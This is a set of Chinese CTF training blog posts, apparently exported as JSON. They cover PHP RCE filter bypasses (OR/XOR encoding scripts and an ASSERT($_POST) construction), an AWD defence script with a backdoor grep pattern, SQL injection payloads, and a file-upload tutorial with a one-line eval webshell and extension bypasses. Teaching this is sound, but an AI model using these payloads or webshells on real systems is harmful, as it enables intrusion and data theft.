&#x27;&lt;/br&gt;&#x27;;    $b=urlencode($a);    echo $b;    \n\n\n\n利用得到的url编码加上取反符号”~”可以绕过一些数字字母过滤\n3.异或这里先了解或运算”||“（”|“）和异或运算”^“\n或运算： 参加运算的两个对象，按二进制位进行“或”运算。\n运算规则：0|0&#x3D;0； 0|1&#x3D;1； 1|0&#x3D;1； 1|1&#x3D;1；即 ：参加运算的两个对象只要有一个为1，其值为1例如: 3|5 可写算式如下： 0000 0011 | 0000 0101 &#x3D; 0000 0111(十进制为7)因此，3|5的值为7。\n这里十进制算出来的可以是ASCII码值所以可以对字符进行运算\n异或运算：参加运算的两个数据，按二进制位进行“异或”运算。\n运算规则：0^0&#x3D;0； 0^1&#x3D;1； 1^0&#x3D;1； 1^1&#x3D;0；即：参加运算的两个对象，如果两个相应位为“异”（值不同），则该位结果为1，否则为0例如：9^5可写成算式如下： 00001001 ^ 00000101 &#x3D; 00001100 (十进制为12)因此，9^5的值为12。\n这里可以参考web42（url编码就是%加上对应字符ASCII码的16进制数）\nimport reimport urllibfrom urllib import parsehex_i = &quot;&quot;hex_j = &quot;&quot;pattern=&#x27;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i&#x27;  #被过滤的字符str1=[&quot;system&quot;,&quot;cat flag.php&quot;] #需要输出的字母指令for p in range(2):    t1 = &quot;&quot;    t2 = &quot;&quot;    for k in str1[p]:        for i in range(256):#ASCII码表一共256个            for j in range(256):                if re.search(pattern,chr(i)) :#如果有过滤字符跳过一次第一次循环                    break                if re.search(pattern,chr(j)) :#如果有过滤字符跳过一次第二次循环                    continue                if i &lt; 16:                    hex_i = &quot;0&quot; + hex(i)[2:]#hex（）将整数转化为16进制数但是会有0x前缀所以从[2:]开始                else:                    hex_i=hex(i)[2:]                if j &lt; 16:                    hex_j=&quot;0&quot;+hex(j)[2:]                else:                    hex_j=hex(j)[2:]#以上代码都是在筛选可用字符对应的16进制码                hex_i=&#x27;%&#x27;+hex_i                hex_j=&#x27;%&#x27;+hex_j                c=chr(ord(urllib.parse.unquote(hex_i))|ord(urllib.parse.unquote(hex_j)))#或运算然后再转为ASCII码表对应的字母 urlib.parse.unquote()为解码url返回它本身的字符串 ord（）是把字符串变成十进制数 chr是把十进制数变成ASCII码对应字符                if(c ==k):                    t1=t1+hex_i                    t2=t2+hex_j                    break            else:                continue            break    print(&quot;(\\&quot;&quot;+t1+&quot;\\&quot;|\\&quot;&quot;+t2+&quot;\\&quot;)&quot;)\n\n这里就是用到了或运算去绕过字母和数字过滤。\n同理我们也可以用异或的运算符号去替换判断条件\n当然异或也可以直接用符号运算去表示字母\nvar_dump(&#x27;#&#x27;^&#x27;|&#x27;); //得到字符 _`var_dump(&#x27;.&#x27;^&#x27;~&#x27;); //得到字符 P    var_dump(&#x27;/&#x27;^&#x27;&#x27;); //得到字符 0    var_dump(&#x27;|&#x27;^&#x27;/&#x27;); //得到字符 S    var_dump(&#x27;&#123;&#x27;^&#x27;/&#x27;); //得到字符 T    $__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);  //变量$__值为字符串&#x27;_POST&#x27;\n\n\n\n\n\n\n\n4.自增$_++&#x3D;1因为在没有给定初值的情况下运行时会认问是false&#x3D;0然后再自增得到1 那么利用自增函数只要‘A’我们就可以用字符拿到所有的字母\n在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array\n这里面就有A\np神的构造\n&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);\n\n但是这个构造太长了局限性很大不是很好用，了解即可。\n","tags":["rce"]},{"title":"AWD的攻与防","url":"/2025/10/03/AWD%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2/","content":"AWD的攻与防AWD线下赛防守脚本：\n1.该脚本基于python，可直接在linux靶机上运行。\n2.开局直接运行起来，会自动对web目录进行备份，并建立hash索引。当web目录下有文件被删除或者被篡改的时候，会自动从备份中恢复文件。如果存在其他文件上传，会自动删除。\n3.无法避免的缺点：由于条件竞争，如果对方在我们删除shell之前就已经在内存中开始生成不死马了，还是有一定几率沦陷。\n# -*- coding: utf-8 -*-## awd文件监控脚本# author：说书人import osimport jsonimport timeimport hashlibdef ListDir(path):  # 获取网站所有文件    for file in os.listdir(path):        file_path = os.path.join(path, file)        if os.path.isdir(file_path):            if initialization[&#x27;ok&#x27;] == &#x27;false&#x27;:                dir_list.append(file_path)            else:                dir_list_tmp.append(file_path)            ListDir(file_path)        else:            if initialization[&#x27;ok&#x27;] == &#x27;false&#x27;:                file_list.append(file_path)            else:                file_list_tmp.append(file_path)def GetHash():  # 获取hash，建立索引    for bak in file_list:        with open(bak, &#x27;rb&#x27;) as f:            md5obj = hashlib.md5()            md5obj.update(f.read())        hash = md5obj.hexdigest()        bak_dict[bak] = hash    if os.path.exists(&#x27;/tmp/awd_web_hash.txt&#x27;) == False:        os.system(&#x27;mkdir /tmp/awd_web_bak/&#x27;)        os.system(&#x27;\\\\cp -a &#123;0&#125;* /tmp/awd_web_bak/&#x27;.format(web_dir))        with open(&#x27;/tmp/awd_web_hash.txt&#x27;, &#x27;w&#x27;) as f:  # 记录web文件hash            f.write(str(json.dumps(bak_dict)))        for i in file_list:  # 记录web文件列表            with open(&#x27;/tmp/awd_web_list.txt&#x27;, &#x27;a&#x27;) as f:                f.write(i + &#x27;\\n&#x27;)        for i in dir_list:  # 记录web目录列表            with open(&#x27;/tmp/awd_web_dir.txt&#x27;, &#x27;a&#x27;) as f:                f.write(i + &#x27;\\n&#x27;)def FileMonitor():  # 文件监控    # 提取当前web目录状态    initialization[&#x27;ok&#x27;] = &#x27;true&#x27;    for file in os.listdir(web_dir):        file_path = os.path.join(web_dir, file)        if os.path.isdir(file_path):            dir_list_tmp.append(file_path)            ListDir(file_path)        else:            file_list_tmp.append(file_path)    for file in file_list_tmp:        with open(file, &#x27;rb&#x27;) as f:            md5obj = hashlib.md5()            md5obj.update(f.read())        hash = md5obj.hexdigest()        bak_dict_tmp[file] = hash    with open(&#x27;/tmp/awd_web_hash.txt&#x27;, &#x27;r&#x27;) as f:  # 读取备份的文件hash        real_bak_dict = json.loads(f.read())    with open(&#x27;/tmp/awd_web_list.txt&#x27;, &#x27;r&#x27;) as f:  # 读取备份的文件列表        real_file_list = f.read().split(&#x27;\\n&#x27;)[0:-1]    with open(&#x27;/tmp/awd_web_dir.txt&#x27;, &#x27;r&#x27;) as f:  # 读取备份的目录列表        real_dir_list = f.read().split(&#x27;\\n&#x27;)[0:-1]    for dir in real_dir_list:  # 恢复web目录        try:            os.makedirs(dir)            print(&quot;[del-recover]dir:&#123;&#125;&quot;.format(dir))        except:            pass    for file in file_list_tmp:        try:            if real_bak_dict[file] != bak_dict_tmp[file]:  # 检测被篡改的文件，自动恢复                os.system(&#x27;\\\\cp &#123;0&#125; &#123;1&#125;&#x27;.format(file.replace(web_dir, &#x27;/tmp/awd_web_bak/&#x27;), file))                print(&quot;[modify-recover]file:&#123;&#125;&quot;.format(file))        except:  # 检测新增的文件，自动删除            os.system(&#x27;rm -rf &#123;0&#125;&#x27;.format(file))            print(&quot;[delete]webshell:&#123;0&#125;&quot;.format(file))    for real_file in real_file_list:  # 检测被删除的文件，自动恢复        if real_file not in file_list_tmp:            os.system(&#x27;\\\\cp &#123;0&#125; &#123;1&#125;&#x27;.format(real_file.replace(web_dir, &#x27;/tmp/awd_web_bak/&#x27;), real_file))            print(&quot;[del-recover]file:&#123;0&#125;&quot;.format(real_file))    file_list_tmp[:] = []    dir_list_tmp[:] = []os.system(&quot;rm -rf /tmp/awd_web_hash.txt /tmp/awd_web_list.txt /tmp/awd_web_dir.txt /tmp/awd_web_bak/&quot;)web_dir = &quot;/var/www/&quot;  # web目录，注意最后要加斜杠file_list = []dir_list = []bak_dict = &#123;&#125;file_list_tmp = []dir_list_tmp = []bak_dict_tmp = &#123;&#125;initialization = &#123;&#x27;ok&#x27;: &#x27;false&#x27;&#125;ListDir(web_dir)GetHash()while True:    print(time.ctime()+&quot;   安全&quot;)    FileMonitor()    time.sleep(1)  # 监控间隔，按需修改\n\n2.数据库恢复需要在配置文件里找到数据库的password然后用命令备份\nmysqldump -uroot -p –all-databases &gt; &#x2F;tmp&#x2F;databases.sql（备份所有数据库）\n恢复\n在mysql终端下执行\nsource  &#x2F;tmp&#x2F;databases.sql\nsource &#x2F;tmp&#x2F;mysql.sql\n2.弱口令\n实用命令\n查找可能的password\ncd /var/www/htmlfind .|xargs grep &quot;password&quot;\n\n查找后门\nfind /var/www/html -name &quot;*.php&quot; |xargs egrep &#x27;assert|eval|phpinfo\\(\\)|\\(base64_decoolcode|shell_exec|passthru|file_put_contents\\(\\.\\*\\$|base64_decode\\(&#x27;\n\n查找flag的位置\n使用 `find / -name *flag*` 或 `grep -rn &quot;flag&quot; *` 类似的语句可以快速发现 flag 所在的地方，方便后续拿分\n\n备份网站源码和数据库\n\nmobaxterm直接拖\n\n 备份数据库在dump源码部分有\n\nlinux命令进行备份\n\nscp -r -P Port remote_username&lt;a class=&quot;at-link&quot; title=&quot;@remote_ip&quot; href=&quot;https://github.com/remote_ip&quot;&gt;@remote_ip&lt;/a&gt;:remote_folder local_file\n\n检查有没有多余无用端口对外开放\nnetstat -anptl\n\n修改密码使用root登录，修改mysql数据库的user表\n使用password()函数进行密码加密注意修改完成后需要刷新权限use mysql;\nupdate user set password&#x3D;password(‘新密码’) where user&#x3D;’用户名’;\n例：update user set password&#x3D;password(‘123’) where user&#x3D;’root’;\n刷新权限：flush privileges;\n","tags":["AWD"]},{"title":"sql注入2","url":"/2025/11/21/sql%E6%B3%A8%E5%85%A52/","content":"SQL注入关于漏洞介绍，sql是一种常见的网络攻击形式，攻击者通过操控sql查询语句，从而达到篡改数据、泄露敏感信息、甚至控制数据库的目的。\n1.sql的漏洞成因SQL 注入漏洞通常是由于对用户输入的数据缺乏适当的校验和过滤，导致恶意代码被直接注入到 SQL 查询语句中，改变了原本的查询逻辑。\n这些通常是开发者对用户输入的参数过滤不严格，导致用户输入的数据能够影响预设查询功能的一种技术，通常将导致数据库原有信息泄露、篡改，甚至被删除。\n实例查询语句:（）\nString query = &quot;SELECT * FROM users WHERE username = &#x27;&quot; + userInput + &quot;&#x27; AND password = &#x27;&quot; + passwordInput + &quot;&#x27;;&quot;;\n\n开发者的本意确实是让用户输入的用户名和密码与数据库中的记录进行匹配验证然后返回前端为真执行查询。（这里的场景就可能是登录等等）\n如果用户输入为 userInput = &#39; OR &#39;1&#39;=&#39;1，那么 SQL 语句将变为：\nSELECT * FROM users WHERE username = &#x27;&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; AND password = &#x27;&#x27;;\n\n这样，SQL 查询总是返回所有用户，因为 &#39;1&#39;=&#39;1&#39; 永远为真。\nSQL注入漏洞对于数据安全的影响：\n数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。网页篡改：通过操作数据库对特定网页进行篡改。网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。服务器被远程控制，被安装后门：经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。破坏硬盘数据，瘫痪全系统。\n2.sql注入——脱库1.联合查询参考语句\n$msg=mysqli_query($con,&quot;update prequest set remark=&#x27;&quot;.$_POST[&#x27;adminremark&#x27;].&quot;&#x27; where id=&#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27;&quot;);\n\n步骤：?id&#x3D;1’ (测试是否存在注入点，报错即存在)，多出的单引号无法完成闭合\n?id&#x3D;1’– - (注释掉后续多余的项，测试页面回显是否正常)\n?id&#x3D;1’ order by n– - (n&#x3D;1,2,3…，使用order来测试字段长度，报错时说明超出了最大的长度)\n?id&#x3D;-1’ union select 1,2,3– - (在当前页面中寻找回显点)（为什么是-1呢）\n?id&#x3D;-1’ union select 1,2,database()– - (在回显点3的位置，显示出当前数据库的名字)\n?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()– -\n?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’XXX’– -\n?id&#x3D;-1’ union select 1,2,group_concat(username,0x3a,passowrd) from XXX– -\n这里面有两个关键点-1是一个空表，union select 可以合并两个表格，order by 原本是为了让表中的数据根据列进行排序\n三个融合就可以达到在空表中回显你任意查询的语句\n一些帮助理解的知识点在MySQL中，把 information_schema  看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。**select：用于指定查询中要返回的字段，如部分已有字段、全部字段（*）、新增计算字段from：**指定查询的数据来源，即表名**where：**用于过滤数据，根据指定的条件排除不符合条件的行**group by：**对字段进行分组聚合，通常与聚合函数一起使用，以便对每个组执行统计或计算**having：**对分组后的结果进行过滤，适用于基于聚合函数的条件筛选**order by：**对查询结果进行排序，可以指定排序的列默认升序，降序要加desc**limit：**限制查询返回的行数，如limit n返回前n行、limit m,n返回m+1到m+n行这里解释了为什么在最后拼接字符段不再需要where的出现，也解释了为什么在from中不需要‘’而where需要的原因。\n2.报错注入(双注入)演示：floor报错：原理：子查询在查询进行时子查询是优先进行的\n\nRand() &#x2F;&#x2F;随机函数，用于产生 0 至 1 之间的随机数\n\nFloor() &#x2F;&#x2F;取整函数，向下舍入为指定小数位数 如：floor(1.45,0)&#x3D; 1;floor(1.55,0) &#x3D; 1\n\nCount() &#x2F;&#x2F;汇总函数\n\nGroup by clause &#x2F;&#x2F;分组语句（利用函数特性）简单的一句话原理就是有研究人员发现，当在一个聚合函数，比如count函数后面如果使用 Group by 分组语句就会把查询的一部分以错误的形式显示出来。\n\n\n\n\n深层次的原因：通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor(random(0)**2)的不确定性，即可能为0也可能为1（group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。）group by  floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。\n结论是：当与临时表里面的值进行比较，如果不同，就插入，但是插入的时候又计算了一次，所以如果插入时计算的值与直接比较的值不一样，则报错！\n\n参考他人博客\n自我总结：可以理解为在group by 读取数据并且保存在临时表的过程中由于floor（random(0)*2）会出现0和1的性质那么在检测时就会出现security0和security1但是在写入临时表的过程中又被计算了一遍也就是说security0写入可能变成security1，那这时候就重复了，重复就会报错告诉你security1重复了那你也就得到了数据库名了。注意的是可能也就是说有时候需要多次刷新才会显示\n套路公式\npayload：?id=-1&#x27; union select count(*),2,concat((select database()),&#x27;*&#x27;,floor(rand()*2))as a from information_schema.tables group by a--+ 这里把查询库的名字命名为a\n\n?id=-1&#x27; union select count(*),2,concat(&#x27;*&#x27;,(select concat_ws(char(32,44,32),id,username,password) from users limit 1,1),&#x27;*&#x27;,floor(rand()*2))as a from information_schema.tables group by a--+  \n\n布尔盲注布尔盲注主要利用的是查询语句执行中的真假\n 步骤&quot;: &quot;1. 确认注入点&quot;,&quot;操作&quot;: &quot;测试 AND 1=1 和 AND 1=2 的页面差异&quot;,&quot;示例&quot;: &quot;id=1 AND 1=1 → 正常页面\\n        id=1 AND 1=2 → 异常页面&quot;\n\n由于真假回显页面不同的问题我们就可以进行布尔盲注\n猜测数据库长度?id&#x3D;1’ and length(database())&#x3D;8– -猜测数据库名的第一个字母id&#x3D;1’ and left(database(),1)&gt;’a’ – -id&#x3D;1’ and left(database(),1)&gt;’z’ – -数据库中的第一个表名id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where table_schema &#x3D; database() limit a,1),b,1))&gt;na是从0开始第几个表，b是为第几个字符，n是ASCII所对应的十进制数\n时间盲注布尔盲注变种，在页面真假不会变化的情况下添加时间延迟的条件使得我们可以通过页面的延迟判断真假\npayload：?id=1&#x27; and if(length(database())=8,sleep(5),1)-- - （如果数据库的长度等于8，则休眠5秒）?id=1&#x27; and if(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1)  （如果第一个表的第一个字母为a，则休眠5秒）\n\nsqli-lab靶场搭建：https://www.zhihu.com/question/564387094/answer/3362337250\n","tags":["sql"]},{"title":"文件上传","url":"/2025/12/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","content":"文件上传1.什么是文件上传漏洞文件上传漏洞实际是因为开发者对于用户文件上传部分的控制不足或者处理缺陷，从而导致了用户可以越过自身有的权限向服务器上传可执行的动态脚本文件（前提是服务器会执行），这里的文件可以是木马，病毒，恶意脚本或者webshell等等。这个漏洞的问题本身不在于文件上传，而是文件上传之后服务器怎么处理，解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重后果。\n造成该漏洞的原因及原理原因：\n1.对于上传文件的后缀名没有严格过滤\n2.对于文件头，二进制内容等等，用于描述文件类型的表述方法没有做检查\n3.没有对文件做不可执行的权限的处理\n原理：\n在web中上传文件的原理是通过将表单设置为multipart&#x2F;form-data，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段 (multipart) 的数据信息，并将其中的文件内容提取出来并保存的。通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名 ( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上。\nHTML表单文件上传机制1.1 表单文件上传基础在Web应用中，文件上传是一种常见的用户交互形式，允许用户通过表单上传文件到服务器。HTML表单提供了  元素，让用户可以选择文件进行上传。一旦用户选择了一个或多个文件，这些文件将被包含在表单数据中，并通过POST方法提交至服务器指定的处理脚本。\n1.2 表单结构和提交机制一个典型的文件上传表单结构如下：\n&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;\n    &lt;input type=&quot;file&quot; name=&quot;fileToUpload&quot; id=&quot;fileToUpload&quot;&gt;\n    &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;\n&lt;/form&gt;\n\nhtml\n在这个表单中， enctype 属性设置为 multipart&#x2F;form-data 是必须的，因为这是处理文件上传的正确编码类型。表单提交后，文件数据会被分割成多个部分，每个部分对应一个表单控件。 \n1.3上传过程前端(可能会有检查限制)-&gt;二进制流（这里会发生服务器端的检查也就是检查文件内容进行进一步的限制）-&gt;服务器解析-&gt;储存到服务器的相应位置\n访问时由于大部分网站会配置php解释器所以在访问.php文件的时候.php文件会被执行。\n用大家建的sqli-lab网站进行说明\n简单的上传页面\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\n服务器端处理文件的代码：\n&lt;?php// 1. 设置上传目录$uploadDir = &#x27;uploads/&#x27;;// 2. 创建目录（如果不存在）if (!file_exists($uploadDir)) &#123;    mkdir($uploadDir, 0777, true);&#125;// 3. 获取上传的文件信息$fileName = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];      // 原始文件名$tmpName = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;];   // 临时文件路径$fileSize = $_FILES[&#x27;file&#x27;][&#x27;size&#x27;];      // 文件大小$fileError = $_FILES[&#x27;file&#x27;][&#x27;error&#x27;];    // 错误代码// 4. 检查是否有上传错误if ($fileError !== 0) &#123;    die(&quot;上传失败，错误代码: $fileError&quot;);&#125;// 5. 生成安全的文件名（防止中文乱码和重复）$safeFileName = time() . &#x27;_&#x27; . preg_replace(&#x27;/[^a-zA-Z0-9\\.]/&#x27;, &#x27;_&#x27;, $fileName);// 6. 移动文件到目标目录$destination = $uploadDir . $safeFileName;if (move_uploaded_file($tmpName, $destination)) &#123;    echo &quot;&lt;h3&gt;success&lt;/h3&gt;&quot;;    echo &quot;name: &quot; . $fileName . &quot;&lt;br&gt;&quot;;    echo &quot;size: &quot; . round($fileSize / 1024, 2) . &quot; KB&lt;br&gt;&quot;;    echo &quot;&lt;a href=&#x27;$destination&#x27;&gt;dowload&lt;/a&gt;&lt;br&gt;&lt;br&gt;&quot;;    echo &quot;&lt;a href=&#x27;index.html&#x27;&gt;return&lt;/a&gt;&quot;;&#125; else &#123;    echo &quot;false！&quot;;&#125;?&gt;\n\n2.我们要上传些什么？一句话木马登场~木马是什么？计算机木马病毒是指隐藏在正常程序中的一段具有特殊功能的恶意代码，是具备破坏和删除文件、发送密码、记录键盘和攻击Dos等特殊功能的后门程序。木马程序表面上是无害的，甚至对没有警戒的用户还颇有吸引力，它们经常隐藏在游戏或图形软件中，但它们却隐藏着恶意。这些表面上看似友善的程序运行后，就会进行一些非法的行动，如删除文件或对硬盘格式化。完整的木马程序一般由两部分组成：一个是服务器端，一个是控制器端。“中了木马”就是指安装了木马的服务器端程序，若你的电脑被安装了服务器端程序，则拥有相应客户端的人就可以通过网络控制你的电脑。为所欲为。这时你电脑上的各种文件、程序，以及在你电脑上使用的账号、密码无安全可言了。\n一句话木马&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;\n\n这个一句话木马是什么意思呢\n它实际上是一个php代码所以它必须写在里面才能被服务器认出来才会被解析执行\n@是执行错误也不报错因为我们上传的cmd实际上是一个变量变量没有被定义是用不了的所以会报错，@存在的意义就是让我们的木马能够被正常执行\n这句话的意思是什么呢？\n我们上传了一个cmd的超全局变量供我们使用，且这个变量是以POST形式接受我们上传的参数的\n（网站的参数上传有GET和POST两种方式）\ncmd=header(&quot;Content-type:text/html;charset=gbk&quot;);exec(&quot;ipconfig&quot;,$out);echo &#x27;&lt;pre&gt;&#x27;;print_r($out);echo &#x27;&lt;/pre&gt;&#x27;;\n\n这个时候我们就可以通过cmd这个变量去执行任意指令接管计算机了\n当然一般情况我们会使用工具去进行连接。\n3.中国蚁剑这就是我们会用到的工具\n安装及原理：https://blog.csdn.net/hj06112/article/details/150274005\n其实原理就是利用上方的cmd变量去执行指令不过这里蚁剑自动帮你把指令输出执行并且把回显结果给返回给你。\n7232\n4.题目演练ctfhub-文件上传无验证\n\n游览上传我们写好的php木马\n\n\n相对路径\n打开蚁剑添加数据\n输入上传文件的位置，url\n以及我们的木马密码也就是一句话木马里的变量cmd\n\n\n\n然后找flag即可\n\n一些限制和绕过手段一.前端限制JavaScript前端文件上传验证一、基本概念JavaScript文件上传验证是一种纯前端验证手段，主要作用是在文件上传到服务器之前，在用户的浏览器中进行初步检查。\n二、主要作用1. 用户体验优化\n即时反馈：用户选择文件后立即得到反馈\n避免不必要的等待：在本地就过滤掉明显不合规的文件\n清晰的错误提示：直接告诉用户问题所在\n\n2. 减轻服务器负担\n过滤掉超大的文件（如超过限制的）\n过滤掉明显错误的文件类型\n减少无效请求到服务器\n\n3. 基本安全检查\n检查文件扩展名（.jpg&#x2F;.png等）\n检查文件大小\n检查MIME类型\n\n简单绕过方法1. 禁用JavaScript\n浏览器设置中关闭JavaScript\n使用NoScript等插件\n\n2. 使用BurpSuite等工具\n拦截HTTP请求\n直接修改文件名和内容\n绕过所有前端检查\n\n二、服务端检测绕过2.1 扩展名检查原理：黑名单&#x2F;白名单验证文件扩展名绕过方法：\n\nIIS6目录解析：/.asp/目录下所有文件按ASP解析\nIIS6分号漏洞：a.asp;jpg被解析为ASP\nWindows空格和点：a.php.或a.php[空格]存储后去除点和空格\nNginx空字节：xxx.jpg%00.php解析为PHP\nApache解析：a.php.rar从右向左识别为PHP\n\n2.2 Content-Type检查原理：检查HTTP头中的MIME类型绕过方法：使用BurpSuite修改Content-Type为允许的类型\n2.3 文件头检测原理：检查文件头部特征（前10字节）绕过方法：给脚本文件添加对应的文件头\n2.4 限制Web服务器行为原理：限制特定目录的脚本执行权限\n绕过方法：上传.htaccess文件覆盖服务器配置\n2.5 00截断原理：文件系统遇到0x00认为文件结束绕过方法：将文件名如evil.php.jpg改为evil.php%00.jpg\n（绕过方法希望大家能自己去多了解这里不做过多的赘述，培训更多的是想让大家了解漏洞的底层逻辑）\n","tags":["文件上传"]}]